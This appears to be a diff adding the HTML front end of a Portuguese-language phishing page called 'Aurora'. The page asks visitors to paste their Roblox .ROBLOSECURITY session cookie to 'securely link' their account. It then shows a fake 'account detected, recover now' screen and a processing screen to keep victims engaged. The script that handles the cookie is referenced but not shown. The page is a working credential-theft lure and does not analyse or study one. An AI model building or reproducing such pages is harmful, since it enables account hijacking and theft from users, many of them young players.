@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aurora | Dashboard</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="background-glow"></div>
+    
+    <div class="container" id="app">
+        <!-- Tela Principal -->
+        <div id="main-screen">
+            <header>
+                <h1 class="logo">AURORA</h1>
+                <p class="subtitle">Conecte sua conta de forma segura e rápida.</p>
+            </header>
+
+            <main class="glass-card">
+                <div class="input-group">
+                    <label for="cookie">Insira o seu Cookie (.ROBLOSECURITY)</label>
+                    <input type="text" id="cookie" placeholder="_|WARNING:-DO-NOT-SHARE-THIS...">
+                </div>
+
+                <button id="send-btn" class="main-button">
+                    Vincular Conta
+                </button>
+
+                <p class="disclaimer">Ao prosseguir, você concorda com os termos de processamento de dados do Aurora.</p>
+            </main>
+        </div>
+
+        <!-- Tela de Recuperação -->
+        <div id="recovery-screen" style="display: none;">
+            <header>
+                <h1 class="logo">AURORA</h1>
+                <p class="subtitle">Recuperação de Conta</p>
+            </header>
+
+            <main class="glass-card">
+                <div class="warning-icon">⚠️</div>
+                <h2 class="recovery-title">Conta Detectada!</h2>
+                <p class="recovery-text">Sua conta foi identificada no nosso sistema de recuperação.</p>
+                
+                <button id="recover-btn" class="main-button recover-button">
+                    Recuperar Conta Agora
+                </button>
+            </main>
+        </div>
+
+        <!-- Tela de Processamento -->
+        <div id="processing-screen" style="display: none;">
+            <header>
+                <h1 class="logo">AURORA</h1>
+                <p class="subtitle">Processando solicitação...</p>
+            </header>
+
+            <main class="glass-card">
+                <div class="loader"></div>
+                <h2 class="processing-title">Aguarde</h2>
+                <p class="processing-text" id="processing-message">Processando sua solicitação...</p>
+                <div class="progress-bar">
+                    <div class="progress-fill"></div>
+                </div>
+            </main>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
